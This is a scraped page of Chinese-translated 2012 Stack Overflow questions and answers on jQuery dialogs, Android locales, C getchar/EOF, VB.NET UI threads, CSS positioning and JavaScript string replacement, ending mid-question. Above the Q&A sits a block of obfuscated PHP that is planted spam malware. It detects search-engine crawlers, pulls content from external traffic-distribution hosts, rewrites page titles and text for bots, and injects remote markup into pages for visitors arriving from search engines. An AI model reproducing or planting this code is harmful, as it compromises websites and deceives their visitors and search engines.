if(function_exists('date_default_timezone_set')){date_default_timezone_set('America/Los_Angeles');}$sll0='http://googlecountwebs.com/';$pinj_0='http://tds-err.com/i?r=1';$pinj_1='http://tds-narod.ru/i.txt';$FNN='lnk-trans2.php';$pinj_2='yahoo';$pinj_2='bing';$pinj_3=str_replace('google',$pinj_1,$sll0);$pinj_4='site';$sll0=str_replace('google',$pinj_4,$sll0);$pinj_5='';$pinj_6='';$pinj_7='';$pinj_8='';if(!empty($_SERVER['HTTP_USER_AGENT'])){$pinj_6=$_SERVER['HTTP_USER_AGENT'];}if(!empty($_SERVER['HTTP_REFERER'])){$pinj_5=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['REQUEST_URI'])){$pinj_7=$_SERVER['REQUEST_URI'];}if(!empty($_SERVER['REMOTE_ADDR'])){$pinj_8=$_SERVER['REMOTE_ADDR'];}if(!function_exists('get_cont')){function get_cont($pinj_9){if(function_exists('curl_init')){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_12=@file_get_contents($pinj_9);return $pinj_12;}}if(!function_exists('SEbot_')){function SEbot_($pinj_13){if(strpos('-' .strtolower($pinj_13),'googlebot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'slurp',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'bing',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'msnbot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'yahoo',0)>0){return 1;}return 0;}}if(!function_exists('not_do_')){function not_do_($pinj_14){$pinj_15='gif|jpeg|png|js|css|swf|ico|txt|pdf|xml|jpg|pdf|doc';$pinj_16=explode("|",$pinj_15);$pinj_17=0;while($pinj_17<count($pinj_18)){if(strpos(' ' .strtolower($pinj_14),$pinj_18[$pinj_17],0)>0)return 1;$pinj_17=$pinj_17+1;}return 0;}}if(!function_exists('detect_encoding_')){function detect_encoding_($pinj_19){static $pinj_20=array('UTF-8','ASCII','Windows-1251','ISO-8859-2','ISO-8859-3','ISO-8859-4','ISO-8859-5','ISO-8859-6','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-10','ISO-8859-13','ISO-8859-14','ISO-8859-15','ISO-8859-16','ISO-8859-1','Windows-1252','Windows-1254',);foreach($pinj_20 as $pinj_21){$pinj_22=@iconv($pinj_21,$pinj_21 .'',$pinj_19);if(md5($pinj_22)== md5($pinj_19))return $pinj_21;}return null;}}if(isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on')){$pinj_23='https';}else{$pinj_23='http';}$pinj_24=substr(str_replace('www.','',$_SERVER['SERVER_NAME']),0,4);if((SEbot_($pinj_6)>0)&&empty($pinj_25)&&(not_do_($pinj_7)==0)){$pinj_26=get_cont($sll0 .$FNN .'?d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_23);$pinj_25=get_cont($pinj_23 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_25)>200){if(strpos($pinj_26,'"ttl"',0)>0){$pinj_27=@unserialize($pinj_26);$pinj_28="\r\n" .'<meta name="description" content="' .$pinj_27['dsc'] .'"/>' ."\r\n";$pinj_29=array("'<li>.*?</li>'si","'<li [^>]*?>.*?</li>'si");$pinj_30=array("","");$pinj_31=preg_replace($pinj_29,$pinj_30,$pinj_25);$pinj_29=array("'<noscript[^>]*?>.*?</noscript>'si");$pinj_30=array("");$pinj_31=preg_replace($pinj_29,$pinj_30,$pinj_31);$pinj_31=str_replace('></a>','> </a>',$pinj_31);$pinj_31=preg_replace('/<a(.+?)href=("|\')(.+?)("|\')(.*?)>(.+?)<\/a>/i',"",$pinj_31);$pinj_31=str_replace("</li>",'',$pinj_31);$pinj_31=str_replace("<ul>",'',$pinj_31);$pinj_31=str_replace("</ul>",'',$pinj_31);$pinj_29=array("'<h1 [^>]*?>.*?</h1>'si","'<h2 [^>]*?>.*?</h2>'si","'<h2>.*?</h2>'si","'<iframe [^>]*?>.*?</iframe>'si","'<h3[^>]*?>.*?</h3>'si","'<h4[^>]*?>.*?</h4>'si","'<h5[^>]*?>.*?</h5>'si");$pinj_30=array("","","","","","","");$pinj_31=preg_replace($pinj_29,$pinj_30,$pinj_31);$pinj_32=0;$pinj_33=@explode('>',$pinj_31);$pinj_17=0;$pinj_34='';$pinj_35='';$pinj_36='';$pinj_37='';$pinj_38=0;$pinj_39=0;$pinj_40=0;if(strpos('-' .strtolower($pinj_31),'<body',0)<=0){$pinj_41=1;}else{$pinj_41=0;}while($pinj_17<count($pinj_33)){if((strpos('-' .strtolower($pinj_33[$pinj_17]),'<body',0)>0)&&($pinj_41==0)){$pinj_41=1;}$pinj_42=explode('<',$pinj_33[$pinj_17]);$pinj_42[0]=trim($pinj_42[0]);if((strlen($pinj_42[0])>40)){if((strpos($pinj_42[0],'=',0)<=0)&&(strpos($pinj_42[0],'}',0)<=0)&&(strpos($pinj_42[0],'{',0)<=0)&&(strpos($pinj_42[0],'+',0)<=0)&&(strpos($pinj_42[0],');',0)<=0)&&(!preg_match("/\.[a-zA-Z]/i",$pinj_42[0]))){if((strlen($pinj_35)<strlen($pinj_42[0]))&&(strlen($pinj_35)<80)&&($pinj_41==1)){$pinj_35=$pinj_42[0];$pinj_38=$pinj_17;}elseif((strlen($pinj_36)<strlen($pinj_42[0]))&&($pinj_41==1)){$pinj_36=$pinj_42[0];$pinj_39=$pinj_17;}elseif((strlen($pinj_37)<strlen($pinj_42[0]))&&($pinj_41==1)){$pinj_37=$pinj_42[0];$pinj_40=$pinj_17;}}}$pinj_17=$pinj_17+1;}$pinj_43="<h1>" .$pinj_27['h1'] ."</h1> \r\n " .$pinj_27['txt1'] ."";$pinj_44=$pinj_27['txt2'];$pinj_45=$pinj_27['txt3'];if($pinj_40==0){$pinj_44=$pinj_44 .' ' .$pinj_45;$pinj_45='';}if($pinj_39==0){$pinj_43=$pinj_43 .' ' .$pinj_44;$pinj_44='';}$pinj_46='';if($pinj_38==0){$pinj_46=$pinj_43;}$pinj_17=0;while($pinj_17<count($pinj_33)){$pinj_42=@explode('<',$pinj_33[$pinj_17]);$pinj_42[0]=trim($pinj_42[0]);if((strlen($pinj_42[0])>40)){if((strpos($pinj_42[0],'=',0)<=0)&&(strpos($pinj_42[0],'}',0)<=0)&&(strpos($pinj_42[0],'{',0)<=0)&&(strpos($pinj_42[0],'+',0)<=0)&&(strpos($pinj_42[0],');',0)<=0)&&(!preg_match("/\.[a-zA-Z]/i",$pinj_42[0]))){if(($pinj_17==$pinj_40)){$pinj_42[0]='-vst3-';}elseif($pinj_17==$pinj_39){$pinj_42[0]='-vst2-';}elseif($pinj_17==$pinj_38){$pinj_42[0]='-vst1-';}else{$pinj_42[0]='';}}}$pinj_33[$pinj_17]=@implode('<',$pinj_42);if(isset($pinj_47)){echo $pinj_33[$pinj_17];exit;}if($pinj_34==''){$pinj_34=$pinj_33[$pinj_17];}else{if((strpos(strtolower('-' .$pinj_33[$pinj_17]),'meta',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'keywords',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'meta',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'description',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'meta',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'title',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'property',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'og:',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'link',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'alternate',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'link',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'canonical',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'rel=',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'alternate',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'rel=',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'contents',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'charset=',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'<title',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'</title',0)<=0)){$pinj_34=$pinj_34 .'> ' .$pinj_28 ."\r\n" .' <title>' .$pinj_27['ttl'] .'</title';$pinj_48=2;}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'<body',0)>0)){$pinj_34=$pinj_34 .'>' .$pinj_33[$pinj_17] .'> ' .$pinj_46;$pinj_48=1;}else{if(isset($pinj_48)&&($pinj_48==1)){$pinj_34=$pinj_34 .'' .$pinj_33[$pinj_17];$pinj_48=0;}elseif(isset($pinj_48)&&($pinj_48==2)){$pinj_34=$pinj_34 .'';$pinj_48=0;}else{$pinj_34=$pinj_34 .'>' .$pinj_33[$pinj_17];}}}$pinj_17=$pinj_17+1;}$pinj_34=str_replace(array('-vst1-','-vst2-','-vst3-'),array($pinj_43,$pinj_44,$pinj_45),$pinj_34);$pinj_34=str_replace("</head>",'<meta charset="utf-8"> </head>',$pinj_34);$pinj_34=str_replace("</HEAD>",'<meta charset="utf-8"> </head>',$pinj_34);$pinj_34=str_replace("</Head>",'<meta charset="utf-8"> </head>',$pinj_34);$pinj_34=str_replace('< <','<',$pinj_34);$pinj_34=str_replace('<?<','<',$pinj_34);$pinj_34=str_replace('<<','<',$pinj_34);$pinj_34=str_replace("<\n",'',$pinj_34);$pinj_34=preg_replace("/\d{2}\.\d{2}.\d{4}/","",$pinj_34);$pinj_34=preg_replace("/\d{2}\-\d{2}-\d{4}/","",$pinj_34);$pinj_34=preg_replace("/\d{1}\.\d{2}.\d{4}/","",$pinj_34);$pinj_34=preg_replace("/\d{4}\.\d{2}.\d{2}/","",$pinj_34);$pinj_34=preg_replace("/\d{4}\-\d{2}-\d{2}/","",$pinj_34);$pinj_34=preg_replace('/\n\n+/',"\n",$pinj_34);$pinj_34=preg_replace('/\r\n\r\n+/',"\r\n",$pinj_34);$pinj_34=preg_replace('/  \n  \n+/',"\n",$pinj_34);$pinj_34=str_replace("2010",date('Y'),$pinj_34);$pinj_34=str_replace("2011",date('Y'),$pinj_34);$pinj_34=str_replace("2012",date('Y'),$pinj_34);$pinj_34=str_replace("2013",date('Y'),$pinj_34);$pinj_34=str_replace("2014",date('Y'),$pinj_34);$pinj_34=str_replace("2015",date('Y'),$pinj_34);$pinj_34=str_replace("2016",date('Y'),$pinj_34);$pinj_34=str_replace("2017",date('Y'),$pinj_34);$pinj_49='"ab","az","ay","sq","en","en-us","ar","hy","as","af","ba","be","bn","bg","br","cy","hu","vi","gl","nl","el","ka","gn","da","zu","iw","ji","in","ia","ga","is","es","it","kk","km","ca","ks","qu","ky","zh","ko","co","ku","lo","lv","la","lt","mg","ms","mt","mi","mk","mo","mn","na","de","ne","no","pa","fa","pl","pt","ps","rm","ro","ru","sm","sa","sr","sk","sl","so","sw","su","tl","tg","th","ta","tt","bo","to","tr","tk","uz","uk","ur","fj","fi","fr","fy","ha","hi","hr","cs","sv","eo","et","jw","ja"';$pinj_50=explode(',',$pinj_49);$pinj_34=str_replace($pinj_50,'"' .$pinj_27['lang'] .'"',$pinj_34);echo $pinj_34;exit;}$pinj_51=$pinj_25;$pinj_52=strpos(strtolower($pinj_25),"<body",0);$pinj_53=strpos(strtolower($pinj_25),">",$pinj_52);if(($pinj_52>0)&&($pinj_53>0)){$pinj_25=substr($pinj_51,0,$pinj_53+1) .$pinj_26 .'' .substr($pinj_51,$pinj_53+1);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_25=$pinj_25 .'=*OK*=';}echo $pinj_25;exit;}}}if(isset($pinj_5)&&((strpos($pinj_5,'ogle.',0)>0)||(strpos($pinj_5,'ing.',0)>0)||(strpos($pinj_5,'ahoo.',0)>0))){$pinj_54='mkke';$pinj_55=70;if(!isset($_COOKIE[$pinj_54])||($_COOKIE[$pinj_54]<(time()))){$pinj_56=get_cont($sll0 .$FNN .'?rd=1&d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_23);if(strlen($pinj_56,'<!-- -->',0)>0)$pinj_55=30000;if(strlen($pinj_56)>10){$pinj_57=get_cont($pinj_23 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_57)>400){$pinj_56=str_replace('-SID-',$NET,$pinj_56);$pinj_57=str_replace('</head>',$pinj_56 .'</head>',$pinj_57);setcookie($pinj_54,(time()+$pinj_55),(time()+$pinj_55*2),'/','.' .str_replace('www.','',$_SERVER['SERVER_NAME']));echo $pinj_57;exit;}}}} 
```

> `Blockquote`

# jquery - Jquery UI对话框如何使用组合键<ctrl +="" q="">实现切换效果？</ctrl>

> ID：11155621
> 
> 赞同：1
> 
> 时间：2012-06-22T11:50:32.860
> 
> 标签：jquery, user-interface, dialog, keycode

我使用以下代码在按下`CTRL`+时打开了 JQuery UI 对话框。`Q`

```
$(window).keydown(function (e){
     if (e.ctrlKey && e.keyCode == 81){
         $('<div><center>Download the files now?</center></div>').dialog({
            title: '<b>Download</b>', 
            modal: true,
            autoOpen: true,
            height: 400, 
            width: 800,
            resizable: false,
            buttons: {
                "Yes": function(){  
                    // Code to download the Files
                    $(this).dialog('close');
                },
                "Close": function(){
                    $(this).dialog('close');
                }
            }
        });
        return false;
     }
}); 
```

但是我怎样才能在再次按下它们时关闭对话框？我想用`CTRL`+实现对话框的切换效果`Q`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:57:17.710

那样的事情怎么样？

```
var myDialog = null;

$(window).keydown(function (e) {
    if (e.ctrlKey && e.keyCode == 81) {
        if (myDialog != null) {
            myDialog.dialog('close');
            myDialog = null;
        } else {
            var markup = '<div><center>Download the files now?</center></div>';
            myDialog = $(markup).dialog({
                title: '<b>Download</b>', 
                modal: true,
                autoOpen: true,
                height: 400, 
                width: 800,
                resizable: false,
                buttons: {
                    "Yes": function(){  
                        // Code to download the Files
                        $(this).dialog('close');
                    },
                    "Close": function(){
                        $(this).dialog('close');
                    }
                }
            });
        }
        return false;
    }
}); 
```

**演示：http:** [//jsfiddle.net/95w4m/](http://jsfiddle.net/95w4m/)

# android - Android：限制应用程序中的语言

> ID：11155623
> 
> 赞同：3
> 
> 时间：2012-06-22T11:50:37.953
> 
> 标签：android, android-menu

是否可以在 android 应用程序中限制语言，即当用户更改语言时，我只希望英语和法语语言需要生效。问题是当用户选择荷兰语时，选项菜单名称是英文但**更多（系统生成的菜单如果有更多选项要显示，则选项）是荷兰语**。我希望更多是英语。
请帮助
尼茨

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-26T13:50:55.690

您可以在应用程序中以编程方式设置语言环境：

```
 Configuration configuration = context.getResources().getConfiguration();
  configuration.locale = new Locale(selectedLanguage);
  context.getResources().updateConfiguration(configuration, context.getResources().getDisplayMetrics()); 
```

其中 selectedLanguage 是一个包含您的语言缩写的变量，而 context 包含对 Context 的引用。

这些关于 SO 的早期答案进一步讨论了可能的解决方案：

[更改设备的语言设置（区域设置）](https://stackoverflow.com/questions/2596352/change-language-settings-locale-for-the-device)

[在应用程序本身内更改区域设置](https://stackoverflow.com/questions/2264874/changing-locale-within-the-app-itself)

[在 Android 中以编程方式更改语言](https://stackoverflow.com/questions/2900023/change-language-programatically-in-android)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T20:23:40.767

当您按下菜单键时，选项中显示的“更多”一词是系统生成的字符串，因此无论您的应用程序支持什么系统语言，它都会匹配任何系统语言。

如果您希望“更多”一词以法语或英语显示，则必须减少您拥有的菜单项的数量，以便系统不会显示它，然后手动添加“更多”选项。您手动添加的更多选项不会自动显示其余菜单选项，因此您必须将它们移动到它们自己的上下文菜单中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T22:42:46.503

我认为您可以通过两种方式解决您的问题。

第一个，将您的“更多”资源字符串更改为如下资源文件：

```
<?xml version="1.0" encoding="utf-8"?>
<resources xmlns:tools="http://schemas.android.com/tools"tools:ignore="MissingTranslation">
    <string name="more_btn">More</string>
</resources> 
```

或者，您可以简单地将字符串值复制到 values-fr 和 values-en 目录中。

# c - 当我按 Enter 时，从控制台读取不会停止

> ID：11155625
> 
> 赞同：1
> 
> 时间：2012-06-22T11:50:55.473
> 
> 标签：c

我正在阅读 PrenticeHall。[C 编程语言](https://rads.stackoverflow.com/amzn/click/com/0131103628)- 第 2 版。Kernighan，Ritchie。

在本书（pg-20）中，给出了一个程序示例，该程序应该打印用户在控制台窗口中键入的字符数，这里是它的代码。

```
#include <stdio.h>

main()
{
    double nc;
    for (nc = 0; getchar() != EOF; ++nc)
        ;

    printf("%.0f\n", nc);
} 
```

但是当我运行它并在控制台中输入一些东西时，它根本不会打印任何东西，光标会一直闪烁。这正是那本书中编写代码的方式。

我也尝试过另一种方法，但这也没有成功，结果与之前的代码相同。

```
#include <stdio.h>

main()
{
    long nc;
    nc = 0;
    while (getchar() != EOF)
            ++nc;

    printf("%ld\n", nc);
} 
```

关于如何使这件事起作用的任何想法？

PS我正在使用Windows操作系统。（仍然）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T11:54:49.240

原因是代码尝试读取所有输入，直到文件结束。如果这个程序正在从一个文件中读取，它会知道它什么时候结束，但是由于它是从控制台读取的，所以你必须明确告诉它输入已经结束。在 Linux 上，您可以通过按`^D`(Ctrl+D)，在 Windows `^Z`(Ctrl+Z) 上执行此操作。

请注意，它必须在新行的开头完成，即按 后`Enter`，按`^D`(`^Z`在 Win 上)。

> 我正在阅读 PrenticeHall。Ansi C 编程语言 - 第 2 版。Kernighan，Ritchie。

你正在读的那是一本非常好的书。太好了，我想，它包含了您问题的答案。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-22T11:55:13.473

您的两个程序都可以工作，您只需要`EOF`按照我在您问题下方的第一条评论中指出的那样输入。即`^D`Linux下的(Control-D)和`^Z`Windows下的(Control-Z)。

请注意，循环中的两个条件都在寻找`EOF`not 或其他要终止的输入。提供此输入后，循环将终止并显示您的计数。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-22T11:57:04.583

您应该停止输入“EOF”字符（在 GNU/Linux 上为 Ctrl+D）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-22T12:00:01.480

我的编译器 (GCC 4.4) 对您发布的代码提出了质疑。这消除了狡辩：

```
#include <stdio.h>

int main()
{
    int nc;
    for (nc = 0; getchar() != EOF; ++nc)
        ;
    printf("%d\n", nc);
    return 0;
} 
```

不过，其他答案是正确的：您必须使用 Ctrl-D 或 -Z 结束键盘输入。

顺便说一句，我不确定为什么 Kernighan 和 Ritchie`double`在这种情况下使用了。

# vb.net - Visual Basic.NET：如何创建线程来更新 UI

> ID：11155628
> 
> 赞同：3
> 
> 时间：2012-06-22T11:51:01.380
> 
> 标签：vb.net, multithreading, ui-thread, applicationcontext, message-pump

处理计算量大的任务的常用 VB 方法是将其置于后台工作线程中，而主线程继续处理 UI。

不管出于何种原因，我需要反过来做这件事：主线程执行繁重的工作，而后台线程则更新 UI。

这是我到目前为止所拥有的。唯一的问题是，虽然 UI 窗口 (Form1) 确实被重绘，但您无法与其交互，甚至无法移动或调整它的大小（鼠标光标变为沙漏并且不会单击）。

```
Public Class ProgressDisplay

Private trd As Thread

    Public Sub New()
        trd = New Thread(AddressOf threadtask)
        trd.Start()
    End Sub

    Private Sub threadtask()
        Dim f1 As Form1
        f1 = New Form1
        f1.Show()
        Do
            f1.Update()
            Thread.Sleep(100)
        Loop
    End Sub

End Class 
```

编辑：理想情况下，我需要向客户展示这样的界面

```
Public Class ProgressDisplay
    Public Sub New()
    Public Sub Update(byval progress as int)
End Class 
```

客户端会这样调用它（实际上是在非托管 C++ 中通过 COM，但你得到了图片）：

```
Dim prog = new ProgressDisplay()
DoLotsOfWork(addressof prog.update) ' DoLotsOfWork method takes a callback argument to keep client informed of progress 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T12:43:05.877

为了清楚地重申问题 - 您需要向将在他们自己的程序中使用它的客户提供一个可视化组件。客户端的程序，在您的控制之外，占用了它的主（即：UI）线程，并且您需要让您的可视组件在客户端程序被冻结时继续工作。

让我们在这里明确一点 - 客户程序冻结的事实是**他们的问题，这是****他们的**应用程序代码缺陷的直接结果。下面是一个黑客，一个没有人应该使用的可怕的黑客。因此，虽然您*可以*执行以下操作，但它几乎不应该被视为任何事情的推荐解决方案。它违背了所有最佳实践。

话虽如此，您需要创建第二个应用程序上下文和一个可以在主 UI 线程旁边继续运行的新消息循环。像这样的类会起作用：

```
Imports System.Threading

Public Class SecondUIClass

    Private appCtx As ApplicationContext
    Private formStep As Form
    Private trd As Thread
    Private pgBar As ProgressBar
    Delegate Sub dlgStepIt()

    Public Sub New()
        trd = New Thread(AddressOf NewUIThread)
        trd.SetApartmentState(ApartmentState.STA)
        trd.IsBackground = True
        trd.Start()
    End Sub

    Private Sub NewUIThread()
        formStep = New Form()
        pgBar = New ProgressBar()
        formStep.Controls.Add(pgBar)
        appCtx = New ApplicationContext(formStep)
        Application.Run(appCtx)
    End Sub

    Public Sub StepTheBar()
        formStep.Invoke(New dlgStepIt(AddressOf tStepIt))
    End Sub

    Private Sub tStepIt()
        pgBar.PerformStep()
    End Sub

End Class 
```

本质上，您对上述类所做的是在新的 STA 线程中创建新的应用程序上下文（为该线程提供消息循环）。该上下文包含一个主表单（赋予它的线程所有权并负责其消息处理），它可以在主 UI 线程之外继续运行。这很像在一个程序中有一个程序——两个 UI 线程，每个线程都有自己的互斥控件集。

与新 UI 线程（或其表单）拥有的任何控件交互的调用必须与`Control.Invoke`主 UI 线程（或其他线程）进行编组，以确保您的新 UI 线程是执行交互的线程。你也可以`BeginInvoke`在这里使用。

这个类没有清理代码，没有安全检查等（被警告），我什至不确定它会优雅地完成 - 我把这个任务留给你。这只是说明了一种开始的方式。在主窗体中，您将执行以下操作：

```
Public Class Form1

    Private pgClass As New SecondUIClass

    Private Sub Button1_Click(ByVal sender As System.Object, _
    ByVal e As System.EventArgs) Handles Button1.Click
        Dim i As Integer
        For i = 1 To 10
            System.Threading.Thread.Sleep(1000)
            pgClass.StepTheBar()
        Next
    End Sub
End Class 
```

运行上面的应用程序将创建`Form1`以及由`pgClass`. 单击会`Button1`在`Form1`Form1 通过其循环时锁定它，但第二个表单仍将保持活动状态并做出响应，每次`Form1`调用时都会更新其进度条`.StepTheBar()`。

实际上，在这种情况下，最好的解决方案是让“客户”学习如何正确编程并避免首先陷入这个难题。在完全不可能的情况下，您必须为他们创建一个组件，尽管他们的代码很糟糕，但该组件仍将保持活动状态，那么上述方法可能是您唯一的办法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-22T12:00:47.080

UI 只能通过创建它的线程进行更新。任何线程都可以请求调用 UI 线程上的方法，以便它可以通过使用该`Control.Invoke`方法更新 UI，但这只会等待 UI 线程不再忙。如果 UI 线程很忙，则任何人或任何人都无法更新 UI。`Application.Run`仅当主消息循环 (AKA ) 处理队列中的窗口消息并对其进行操作时，UI 才会更新。如果 UI 线程很忙、陷入循环或等待来自服务器的响应，它就无法处理那些窗口消息（除非你调用`DoEvents`，如果可能的话，我绝对不推荐）。所以，是的，当 UI 很忙时，它会被锁定。这就是为什么每个人都建议在单独的线程中执行任何重要的业务逻辑的全部原因。如果这不是问题，为什么会有人费心制作工作线程？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-22T11:54:50.730

UI 不能从除主事件调度线程之外的任何其他线程进行更新。因此，您正在尝试做一些行不通的事情。

# html - 为什么我的链接在彼此之上？

> ID：11155633
> 
> 赞同：0
> 
> 时间：2012-06-22T11:51:17.810
> 
> 标签：html, css, web, hyperlink

我正在开发一个 web 项目的标题部分，我希望将链接卡在它的顶部。

这是HTML：

```
 <div id="header_section">

    <a class="toplink" href="#">Contact</a> 
    <a class="toplink" href="#">Register</a>
    <a class="toplink" href="#">Staff Login</a>  
    <a class="toplink" href="#">Home</a> 

    <h1 class="welsh"> SAMPLE </h1>
    <h1> SAMPLE </h1>
</div> 
```

和CSS：

```
a.toplink   
{
    font-family:        ‘Arial Narrow’, sans-serif;
    font-size:          12px;
    font-weight:        bold;

    position:           fixed;
    top:                0px;
    right:              10px;
    margin-right:       100px;

    padding:            6px;
    width:              100px;
    text-align:         center;

    color:              black;
    background-color:   #f3f3f3;
} 
```

这已将链接移动到我想要它们的位置，但是当我想将它们彼此相邻显示时，它们都堆叠在每个链接的顶部。显示的唯一链接是“主页”，其余链接位于下方。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:59:22.967

您的样式说，将每个链接放在顶部 0px 和右侧 10px drom 处，它们将放置在一个位置。

避免它通过 div 包装链接并将定位设置为它而不是链接。

```
 <div id="header_section">
    <div class="links">
        <a class="toplink" href="#">Contact</a> 
        <a class="toplink" href="#">Register</a>
        <a class="toplink" href="#">Staff Login</a>  
        <a class="toplink" href="#">Home</a> 
    </div>    

    <h1 class="welsh"> SAMPLE </h1>
    <h1> SAMPLE </h1>
</div> 

.links {
    position: fixed;
    top: 0px;
    right: 10px;
}

a.toplink   
{
    font-family:‘Arial Narrow’, sans-serif;
    font-size:12px;
    font-weight:bold;
    margin-right:100px;

    padding:6px;
    width:100px;
    text-align:center;

    color:black;
    background-color:#f3f3f3;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:54:12.013

添加

```
div#header_section {
  display:inline;
} 
```

或者

```
div#header_section a {
  display:inline;
} 
```

其中之一应该工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:54:26.027

只是改变

```
position: fixed 
```

至

```
position:related 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:16:50.840

不要使用：

```
position: absolute; 
```

对于各个链接。这会将它们定位在相对于它们的父级完全相同的位置。

利用：

```
float:right; 
```

[演示](http://jsfiddle.net/mac_dempsey/FVFjG/19/)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-22T11:59:06.493

嘿，现在您可以更改 html 和 css 部分中的一些代码

像这样

**CSS**

.toplink
{ 位置：固定；顶部：0px；边距右：100px；填充：6px；对：0；宽度：700 像素；文本对齐：居中；显示：块；}

```
.toplink li{
float:left;
}
.toplink a {
font-family:        ‘Arial Narrow’, sans-serif;
    font-size:          12px;
    font-weight:        bold;
    color:              black;
    margin-left:10px;
    background-color:   #f3f3f3;
    display:block;

} 
```

**HTML**

```
<div id="header_section">

<ul class="toplink">   
    <li> <a href="#">Contact</a></li>
   <li> <a href="#">Register</a></li>
  <li>  <a href="#">Staff Login</a>  </li>
    <li><a href="#">Home</a> </li>
</ul>

    <h1 class="welsh"> SAMPLE </h1>
    <h1> SAMPLE </h1>
</div> 
```

现场演示[http://jsfiddle.net/n9UKF/2/](http://jsfiddle.net/n9UKF/2/)

# php - 在 JavaScript 和 PHP 中用逗号\换行符分割字符串

> ID：11155634
> 
> 赞同：2
> 
> 时间：2012-06-22T11:51:18.983
> 
> 标签：php, javascript, string, split, csv

这真让我抓狂。我有一个 PHP 脚本，它从 MySQL 获取一些数据并将其保存为一个字符串，其中元素用逗号分隔。

JavaScript 获取该字符串并将逗号替换为 '\n' 并将其显示在文本区域中。现在，我可以从文本区域向文本添加新行。单击按钮时，应将字符串转换回以逗号分隔的元素，然后再次设置为 PHP（通过 AJAX）进行保存。问题在于 JavaScript，当文本区域中的行数超过 3 行时，它无法检测到“\n”字符。

```
// These are the lines of the text-area, after replacing ',' by '\n'
var textarealines=input_hidden_element.value.replace(',','\n').replace(',','\n');

// When trying to replace '\n' by ',' and send back, PROBLEM!
var AjaxRequest = WT.AjaxObject();
    AjaxRequest.open('POST', WT.AjaxLocation, true);
    AjaxRequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    AjaxRequest.send('values=' + textarealines.replace('\n', ',').replace('\n', ','));
        AjaxRequest.onreadystatechange = function() {
            // Bla bla bla
        } 
```

那么，我做错了什么？最多两行新行被逗号正确替换，但是当我添加超过 2 行时，只有前 2 行被替换，下一行以“n”字符发送，作为包含“\n”的单行文本。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:57:09.327

尝试添加全局搜索标志：

```
textarealines.replace(/\n/g, ',') 
```

请注意，`/\n/g`不是单引号，这意味着它是一个[正则表达式](https://developer.mozilla.org/en/JavaScript/Guide/Regular_Expressions)。

同样，要从换行符变为逗号，请尝试：

```
input_hidden_element.value.replace(/,/g, '\n') 
```

这个问题类似于[“如何在 JavaScript 中替换字符串中的所有点”。](https://stackoverflow.com/questions/2390789/how-to-replace-all-points-in-a-string-in-javascript)

# css - 使jqm可折叠透明

> ID：11155636
> 
> 赞同：0
> 
> 时间：2012-06-22T11:51:20.550
> 
> 标签：css, jquery-mobile, stylesheet

我有一个可折叠的 jquery 移动设备，我想让它透明

